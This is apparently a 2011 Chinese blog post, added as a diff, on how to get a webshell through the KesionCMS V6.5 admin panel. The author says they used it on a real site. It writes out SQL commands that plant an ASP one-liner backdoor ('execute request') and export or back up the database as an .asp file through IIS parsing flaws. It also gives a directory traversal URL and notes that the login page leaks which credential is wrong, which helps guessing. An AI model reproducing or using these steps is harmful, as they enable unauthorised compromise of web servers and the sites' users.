@@ -1,0 +1,66 @@
+KesionCMS V6.5后台拿SHELL方法2011-03-29 0:21最近弄一个站点，是KesionCMS V6.5的WEB系统，试了下后台拿webshell方法,记下来.
+
+进入后台执行sql命令
+
+create table E:\wenxiushi\wz001\\KS_Data\Collect\KS_Collect.Mdb.cmd  (a varchar(50))
+
+insert into E:\wenxiushi\wz001\KS_Data\Collect\KS_Collect.Mdb.cmd  (a) values ('┼攠數畣整爠煥敵瑳∨∣┩愾') 
+
+
+一句话密码是 #
+
+然后去数据库备份成caonimei.ASP就可以了
+
+
+
+1.
+
+新建x.asp用户再结合IIS的文件夹解析漏洞，是可以拿到SHELL的，前提是没有禁止.asp目录的访问,我弄的目标站，不允许访问.asp这样的目录下面的文件的.
+
+2.
+
+后台SQL执行导出webshell
+
+理论上是可以的，我在本地可以导出ok.asp;o.xls这样的文件的。但是TXT文件的话，";"会被替换成"_".也就不起作用了。
+
+create table cmd (a varchar(50))
+
+insert into cmd (a) values ('┼攠數畣整爠煥敵瑳∨∣┩愾')
+
+OR
+
+insert into cmd (a) values ('<%execute request("a")%>')
+
+select * into [a] in 'd:\wwwroot\a.asp;a.xls' 'excel 8.0;' from cmd
+
+导出去以后，IIS需要重启一次。WEB才没有挂掉。但是我第一次导出的时候，并没有挂。
+
+导出去以后同目录下面还会生成一个INI的文件。
+
+3.
+
+数据库插马，然后备份SHELL
+
+选择KS_Collect.Mdb数据库，因为数据量小些，方便。
+
+当然也可以把主数据库的NOTDOWN里面的数据UPDATA成一句话备份。
+
+create table C:\wwwroot\KS_Data\Collect\KS_Collect.Mdb.cmd  (a varchar(50))
+
+insert into C:\wwwroot\KS_Data\Collect\KS_Collect.Mdb.cmd  (a) values ('┼攠數畣整爠煥敵瑳∨∣┩愾')//此处一点要弄编码，不要有杂的符号.
+
+然后去备份成ASP页面的文件，就可以了，有时候不成功的话，插马的语句选择是关键。
+
+drop table C:\wwwroot\KS_Data\Collect\KS_Collect.Mdb.cmd
+
+
+系统还有其他地方有安全隐患的地方。
+
+如跨目录浏览http://www.xxx.org/admin/KS.AdminFiles.asp?UploadDir=../..
+
+
+
+在后台管理的登录界面，可以猜测管理员账号,密码，管理认证码，都是单独报错误的。
+
+ 
+ 
